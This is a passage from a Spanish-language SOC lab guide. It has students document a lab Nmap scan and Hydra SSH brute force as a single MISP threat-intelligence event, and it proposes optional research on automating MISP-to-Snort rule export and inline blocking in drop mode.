+* Diferencia entre "detectar un ataque" (lo que ya hacía el Level-01 solo) y "saber que ese ataque tiene relación con una amenaza conocida" (lo que añade MISP): qué aporta eso a la priorización en un SOC real.
+
+---
+
+## Ejercicio 2.7 — MISP: consolidar una ruta de ataque completa como caso de CTI
+
+### Objetivo
+
+Todos los eventos de MISP creados hasta ahora (Ejercicios 2.1 y 2.6) tienen **un único atributo central**: un IOC aislado, como "esta IP es sospechosa" o "esta otra es un C2". Cada evento cuenta una frase, no una historia. En la vida real, esto no es lo que hace un analista de SOC después de investigar un incidente: no anota "la IP X es mala" y ya está, escribe el **informe del incidente completo**, quién atacó, cómo, con qué, cuándo y qué consiguió.
+
+Este ejercicio hace precisamente eso: coger un ataque **real y ya ejecutado** en el Level-01 (el reconocimiento del Ejercicio 1.4 seguido de la fuerza bruta SSH del Ejercicio 1.6) y, en vez de meter otro dato suelto, construir **un único evento que sea ese informe**: quién (`ip-src` del atacante), por dónde (`port` objetivo), qué consiguió (`target-user` comprometido), y con qué técnica en cada fase (Galaxies `T1595`/`T1110`), todo enlazado en una sola narrativa.
+
+Un IOC suelto caduca rápido y da poco contexto: un analista que se lo encuentre dentro de un mes no sabe si es información valiosa o ruido. Un evento como el de este ejercicio, en cambio, sigue siendo útil aunque la IP concreta cambie, porque documenta un **patrón de ataque completo** (reconocimiento seguido de fuerza bruta contra SSH con una credencial débil), que es lo que de verdad se reutiliza para hunting o para justificar una mejora de detección. Dicho de otro modo: los Ejercicios 2.1 y 2.6 enseñaron el **mecanismo** de MISP (cómo crear eventos y atributos); este ejercicio usa ese mecanismo para producir algo con valor real de CTI.
+
+### Prerrequisitos
+
+* Ejercicios 1.4 (reconocimiento Nmap) y 1.6 (fuerza bruta SSH con Hydra) completados, con sus evidencias disponibles (capturas, logs de Wazuh, salida de Hydra).
+* Ejercicio 2.0 completado (usuario de laboratorio).
+* Recomendable: Ejercicio 2.1 completado (aquí se reutiliza el mecanismo de crear eventos/atributos, ampliado a más tipos).
+
+---
+
+### 2.7.1. Preparación e identificación
+
+Antes de tocar MISP, recopile la evidencia real que ya generó en el Level-01:
+
+* **IP de `caldera-server`** (el atacante), usada tanto en el reconocimiento del Ejercicio 1.4 como en el ataque del Ejercicio 1.6.
+* **Puerto atacado por Hydra**: `22` (SSH).
+* **Usuario y credencial** que Hydra consiguió en el Ejercicio 1.6 (están en la evidencia que entregó en ese ejercicio).
+* **Marca de tiempo** aproximada de cada fase (reconocimiento y fuerza bruta), a partir de los logs de Wazuh o de la salida de Hydra.
+
+**Evidencie**
+
+* Lista con los cuatro datos anteriores, recopilados antes de crear el evento.
+
+### 2.7.2. Ejecución (construir el evento consolidado)
+
+1. Inicie sesión como el **usuario de laboratorio**.
+2. Cree un evento nuevo: `Info` = "Ruta de ataque completa: reconocimiento y fuerza bruta SSH (Level-01)".
+3. Añada los siguientes atributos, todos con `Distribution: Inherit event`:
+
+   | Atributo | Type | Category | Marcar IDS | Comentario sugerido |
+   |---|---|---|---|---|
+   | IP del atacante | `ip-src` | `Network activity` | Sí | "Origen del reconocimiento (Ejercicio 1.4) y del ataque de fuerza bruta (Ejercicio 1.6)" |
+   | Puerto atacado | `port` | `Network activity` | Sí | "Puerto SSH objetivo del ataque de fuerza bruta" |
+   | Credencial comprometida | `target-user` | `Targeting data` | No | "Usuario obtenido por Hydra en el Ejercicio 1.6" |
+
+   > ℹ️ `target-user` no se marca como IDS: no es un patrón de red exportable a un IDS, es información de contexto sobre a quién/qué afectó el ataque. Si no encuentra `target-user` en el desplegable de `Type`, búsquelo dentro de la categoría `Targeting data`.
+
+4. Ajuste el campo de fecha del evento (`Date`) a la fecha real en la que ejecutó el Ejercicio 1.6, para que el evento refleje cuándo ocurrió el ataque, no cuándo lo estáis documentando.
+5. Añada dos Galaxies ATT&CK, una por fase (**Add new cluster**):
+   * `T1595 - Active Scanning` (reconocimiento, Ejercicio 1.4).
+   * `T1110 - Brute Force` (fuerza bruta, Ejercicio 1.6).
+6. En el campo de descripción del evento (o en un `Contextual Comment`), narre brevemente la secuencia: reconocimiento → fuerza bruta → acceso conseguido.
+7. **Publish** el evento.
+
+**Evidencie**
+
+* Captura del evento con los 3 atributos (`ip-src`, `port`, `target-user`) y las 2 Galaxies aplicadas.
+
+### 2.7.3. Validación
+
+Revise el evento ya publicado y compárelo mentalmente con el del Ejercicio 2.1 (un único `ip-src` suelto, sin más contexto): este evento nuevo debería poder leerse de principio a fin como el resumen de un incidente real, no como un IOC aislado.
+
+**Evidencie**
+
+* Captura final del evento completo (todos los atributos, Galaxies y descripción/comentario visibles).
+
+### Validación / Troubleshooting
+
+* Si no encuentra el tipo `target-user`, revise que está buscando dentro de la categoría `Targeting data`; si aun así no aparece en su versión de MISP, use el tipo genérico `text` con un comentario aclaratorio.
+* Si no recuerda el usuario/contraseña exactos del Ejercicio 1.6, revise las evidencias que entregó en aquel ejercicio antes de continuar.
+
+### Evidencias a entregar
+
+* Lista de evidencia recopilada en la preparación.
+* Captura del evento con los 3 atributos y las 2 Galaxies.
+* Captura final del evento publicado.
+
+### Conclusión final
+
+Incluya:
+
+* Diferencia entre un IOC aislado (Ejercicio 2.1) y un caso de CTI consolidado (este ejercicio): qué aporta el contexto y la relación entre indicadores frente a un dato suelto.
+* Por qué en un SOC real rara vez se registra un único indicador sin relacionarlo con el resto de la ruta de ataque: el valor de la CTI está tanto en los indicadores como en cómo se conectan entre sí.
+* Cómo este ejercicio cierra el ciclo del laboratorio en el sentido inverso a los anteriores: en vez de usar MISP para detectar un ataque nuevo, se usa la propia actividad ya generada en el Level-01 como fuente de la inteligencia que alimenta MISP.
+
+---
+
+## Investigación Opcional — MISP → Snort: automatización de IoCs e IDPS
+
+Actividad opcional para llevar el Ejercicio 2.5 (exportación manual, puntual) un paso más allá: **automatizar** la exportación de IoCs de MISP a Snort, y explorar qué implicaría pasar de un IDS puramente pasivo (alerta) a un **IDPS** capaz de cortar tráfico de forma activa (`drop`/`reject`). El objetivo consiste en entender **qué cambia técnica y operativamente** al automatizar ese paso, y documentar los riesgos con el mismo rigor que el resto del laboratorio.
+
+> Idea: elegir **2-3 bloques** y documentar cada uno con *concepto → prueba (o diseño, si no es viable en el VM actual) → evidencia → conclusión*.
+
+### Qué se entrega
+
+1. **Documento breve** (2-3 páginas) con un apartado por bloque elegido.
+2. **Script(s)** desarrollados (si el bloque lo incluye) y su código comentado.
+3. **Capturas/logs** de las pruebas realizadas.
+4. **Checklist** final de lo probado (probado / diseñado pero no ejecutado / pendiente), justificando por qué en cada caso.
+
+### Bloques de investigación (elige 2-3)
+
+#### 1) Automatizar la exportación MISP → Snort
+
+**Teoría (qué entender)**
+
+* El Ejercicio 2.5 usa **Download as...** manualmente, una vez. En producción, los IoCs de MISP cambian constantemente: hace falta un proceso que repita esa exportación de forma periódica sin intervención humana.
+* MISP expone la misma exportación NIDS por API (autenticada con API key), lo que permite guionizarla con `curl`/`PyMISP`.
+* Recargar Snort con reglas nuevas no es gratis: hay que decidir entre reiniciar el proceso (corta la captura unos instantes) o usar un mecanismo de recarga en caliente si la versión de Snort lo soporta, y validar la sintaxis del `.rules` **antes** de aplicarlo (una regla mal formada no debería tumbar todo el IDS).
+
+**Práctica (qué probar)**
+
+* Escribir un script propio (bash o Python) que:
+  * autentique contra la API de MISP con una API key (reutilizando el usuario del Ejercicio 2.0/2.3, con el privilegio mínimo necesario),
+  * descargue la exportación NIDS de uno o varios eventos (o de un feed concreto),
+  * sustituya el fichero de reglas en `snort-server` de forma idempotente (sin duplicar reglas en ejecuciones repetidas),
+  * valide la sintaxis antes de aplicar el cambio,
+  * recargue o relance Snort.
+* Programar la ejecución periódica (`cron` o `systemd timer`) y dejarlo correr varios ciclos.
+* Añadir un IoC nuevo en MISP entre dos ejecuciones y comprobar que aparece automáticamente en Snort sin intervención manual.
+
+**Evidencia**
+
+* Código del script + log de al menos 2 ejecuciones automáticas.
+* Captura de un IoC añadido en MISP y, en la siguiente ejecución programada, detectado por Snort sin haber tocado nada a mano.
+
+---
+
+#### 2) De IDS a IDPS: qué exige realmente el modo `drop`
+
+**Teoría (qué entender)**
+
+* Snort en modo **IDS** (el que usa el laboratorio) es pasivo: recibe una copia del tráfico y solo alerta, nunca corta nada, así que una regla `drop` en ese modo **no bloquea de verdad**.
+* Para bloquear tráfico de forma real (**IDPS/IPS**), Snort necesita estar **en línea** con el tráfico, no en una copia (span/mirror): recibiendo el paquete, decidiendo, y reenviándolo o descartándolo antes de que llegue a su destino. Esto exige un modo de captura distinto (p. ej. AF_PACKET en modo inline con dos interfaces formando un puente, o NFQUEUE vía `iptables`), no un simple cambio de `alert` a `drop` en la regla.
+* Investigar primero si el `snort-server` actual del laboratorio está desplegado en una posición de red que permitiría modo inline (¿tiene una única interfaz en modo promiscuo, o dos interfaces en el camino real del tráfico?). Es muy probable que la topología actual (pensada para IDS) no lo permita sin cambios de red; documentar por qué es un resultado válido de esta investigación.
+
+**Práctica (qué probar)**
+
+* Documentar la topología de red actual de `snort-server` y razonar si permite modo inline tal cual, o qué cambiaría falta (interfaces, bridge, `iptables`/NFQUEUE).
+* Si el entorno lo permite (aunque sea en una VM de prueba aparte, **no** sobre el `snort-server` compartido del laboratorio, para no romper la detección del resto de ejercicios): montar una prueba mínima de Snort inline y comprobar que una regla `drop` corta de verdad una conexión de prueba.
+* Si no es viable en el VM actual, diseñar (sin ejecutar) los pasos concretos que harían falta, como si fuera una propuesta de mejora de arquitectura para el laboratorio.
+
+**Evidencia**
+
+* Si se ejecuta: captura de una conexión bloqueada por `drop` en modo inline (y de la misma regla en modo IDS, sin bloquear, como contraste).
+* Si no se ejecuta: documento de diseño con los cambios de red necesarios y por qué no se aplicaron sobre el `snort-server` compartido.
+
+---
+
+#### 3) Confianza y falsos positivos al automatizar el bloqueo
+
+**Teoría (qué entender)**
+
+* Automatizar IoCs de MISP hacia reglas `drop` sin filtrar es peligroso: un feed público puede incluir IPs obsoletas, mal atribuidas, o compartidas (NAT/CDN), y un `drop` automático convierte un error de threat intel en una interrupción de servicio real.
+* Un enfoque más realista es **escalonado**: todo IoC nuevo entra en modo `alert` (como en el Ejercicio 2.5); solo pasa a `drop` automáticamente si cumple un criterio de confianza explícito (por ejemplo, un tag concreto en MISP tipo `confirmed` o un nivel de TLP determinado, o si ha sido validado manualmente por un analista).
+
+**Práctica (qué probar)**
+
+* Proponer y documentar una política de confianza concreta para este laboratorio (qué tag/criterio en MISP habilitaría el paso a `drop`).
+* Adaptar el script del bloque 1 para que filtre la exportación por ese criterio (p. ej. consultando solo atributos con un tag concreto vía la API) y genere **dos** ficheros de reglas separados: uno en `alert` (todo) y otro en `drop` (solo los de confianza alta).
+* Razonar qué pasaría si un IoC de confianza alta resulta ser un falso positivo: cómo se detectaría y cómo se revertiría el bloqueo.
+
+**Evidencia**
+
+* Documento con la política de confianza propuesta.
+* Los dos ficheros de reglas generados (`alert` vs `drop`) a partir del mismo evento/feed de MISP, con el filtro aplicado.
+
+### Plantilla de ejemplo
+
+Para cada bloque seleccionado, redactar:
+
+* **Concepto:** qué es y por qué importa.
+* **Prueba realizada (o diseño propuesto):** qué se ejecutó, o qué se habría ejecutado y por qué no fue posible en el VM actual.
+* **Resultado observado:** qué pasó (éxito/fallo) y por qué crees que ocurrió.
+* **Evidencias:** capturas, logs y/o código.
+* **Conclusión:** qué aprendiste, qué riesgos identificaste, y qué mejorarías en una siguiente iteración.
 
 ---
 
